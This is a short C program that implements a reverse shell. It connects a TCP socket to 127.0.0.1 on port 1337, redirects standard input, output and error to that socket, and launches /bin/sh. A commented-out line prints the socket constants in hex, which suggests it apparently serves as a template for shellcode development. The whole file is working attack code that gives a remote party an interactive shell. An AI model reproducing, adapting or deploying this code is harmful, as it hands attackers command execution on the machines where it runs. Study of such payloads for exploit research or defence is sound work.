#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("127.0.0.1");
    sa.sin_port = htons(1337);
    
    //printf("AF_INET=%d\nSOCK_STREAM=%d\ninet_addr=0x%x\nport=0x%x\nsizeof(sockaddr_in)=%d\n", AF_INET, SOCK_STREAM, inet_addr("127.0.0.1"), htons(1337), sizeof(sa));
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
